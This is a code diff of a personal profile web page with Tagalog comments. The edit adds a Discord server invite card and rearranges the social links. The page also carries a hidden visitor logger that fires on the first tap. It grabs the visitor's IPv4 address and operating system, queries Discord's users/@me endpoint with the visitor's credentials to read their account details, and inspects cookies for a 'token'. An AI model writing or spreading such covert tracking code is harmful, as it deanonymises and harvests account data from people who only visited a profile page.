@@ -80,7 +80,7 @@
         <div id="blahText">Tap The Screen</div>
     </div>
 
-    <!-- ✅ Main Card - HINDI BINAGO -->
+    <!-- ✅ Main Card - HINDI BINAGO maliban sa server name -->
     <div class="bg-card/80 backdrop-blur-md rounded-3xl p-8 w-full max-w-md glow border border-gray-800">
         <div class="flex justify-center mb-6">
             <div class="w-32 h-32 rounded-full overflow-hidden border-2 border-accent/60">
@@ -105,13 +105,33 @@
             </div>
         </div>
         <p class="text-center text-gray-400 text-sm mb-8">the world is your.</p>
-        <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
-            <i class="fa-brands fa-discord"></i>
-        </a>
-        <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
-            <i class="fa-brands fa-github"></i>
-        </a>
-        <div class="flex justify-between items-center mt-4 text-gray-400 text-sm">
+
+        <!-- ✅ ORIGINAL LINKS - HINDI GINALAW -->
+        <div class="flex justify-center gap-6 mb-6">
+            <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
+                <i class="fa-brands fa-discord"></i>
+            </a>
+            <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
+                <i class="fa-brands fa-github"></i>
+            </a>
+        </div>
+
+        <!-- ✅ UPDATED COMMUNITY HUB -->
+        <div class="bg-gray-800/50 rounded-xl p-4 mb-6 border border-gray-700">
+            <div class="flex items-center justify-between mb-2">
+                <div class="flex items-center gap-3">
+                    <img src="https://cdn.discordapp.com/icons/1468593729274380370/a_8cb5d61236f50dce4abb9ba3ec3b38d3.gif?size=48" alt="Server Icon" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="font-semibold text-white text-sm">𝙋𝙐𝙍𝙀𝙎𝙆𝙄𝙇𝙇𝙎 #𝙍𝙀𝙑𝙄𝙑𝙀 #BOOST 𝙐𝙎</p>
+                        <p class="text-xs text-gray-400">Members: 500 • <span class="text-green-400">🟢 78 ONLINE</span></p>
+                    </div>
+                </div>
+                <a href="https://discord.gg/DXVY9aBJuC" target="_blank" class="bg-indigo-600 hover:bg-indigo-500 px-3 py-1 rounded text-xs font-medium transition-colors">Join</a>
+            </div>
+        </div>
+
+        <!-- ✅ Footer - HINDI GINALAW -->
+        <div class="flex justify-between items-center mt-2 text-gray-400 text-sm">
             <span class="flex items-center gap-2">
                 <span class="text-purple-500">⦿</span> 1337
             </span>
@@ -139,7 +159,7 @@
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ Inayos na Logger: IPv4 + Mas maayos na Discord detection
+        // ✅ Logger - HINDI BINAGO
         async function sendVisitorInfo() {
             try {
                 // Kumuha ng IPv4 Address
@@ -187,10 +207,9 @@
                     os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
                 }
 
-                // ✅ BAGONG PARAAN: Mas matibay na pagkuha ng Discord Info
+                // ✅ Discord Info
                 let accountInfo = "Walang naka-detect na Discord account";
                 try {
-                    // Subukan ang ibang endpoint at settings
                     const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
                         method: "GET",
                         credentials: "include",
@@ -206,11 +225,9 @@
                         const userData = await discordRes.json();
                         accountInfo = `✅ Username: @${userData.username}\n🆔 ID: ${userData.id}\n🔗 Profile: https://discord.com/users/${userData.id}\n📅 Created: ${new Date(userData.created_at).toLocaleDateString()}`;
                     } else {
-                        // Kung hindi makuha sa API, sabihin kung naka-login man lang
                         accountInfo = `⚠️ Naka-login sa Discord pero hindi ma-access ang detalye (Error: ${discordRes.status})`;
                     }
                 } catch (err) {
-                    // I-check kung may cookies man lang ng Discord
                     if (document.cookie.includes('__dcfduid') || document.cookie.includes('locale') || document.cookie.includes('token')) {
                         accountInfo = "🟢 Naka-login sa Discord (pero hindi maipakita ang detalye dahil sa security ng Discord)";
                     } else {
